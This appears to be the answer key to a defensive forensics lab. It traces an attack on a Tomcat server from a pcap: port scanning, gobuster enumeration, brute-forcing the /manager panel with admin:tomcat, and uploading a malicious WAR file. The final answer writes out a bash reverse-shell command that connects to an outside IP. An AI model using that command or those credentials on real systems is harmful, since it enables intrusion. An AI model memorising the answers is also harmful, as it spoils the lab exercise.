# Here are the answers for lab questions!

## Questions and Answers

### Q1
Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

**Answer:** `14.0.0.120`

### Q2
Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated?

**Answer:** `Guangzhou`

### Q3
From the pcap analysis, multiple open ports were detected as a result of the attacker's activity scan. Which of these ports provides access to the web server admin panel?

**Answer:** `8080`

### Q4
Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

**Answer:** `gobuster`

### Q5
Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?

**Answer:** `/manager`

### Q6
Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?

**Answer:** `admin:tomcat`

### Q7
Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

**Answer:** `JXQOZY.war`

### Q8
Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

**Answer:** `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
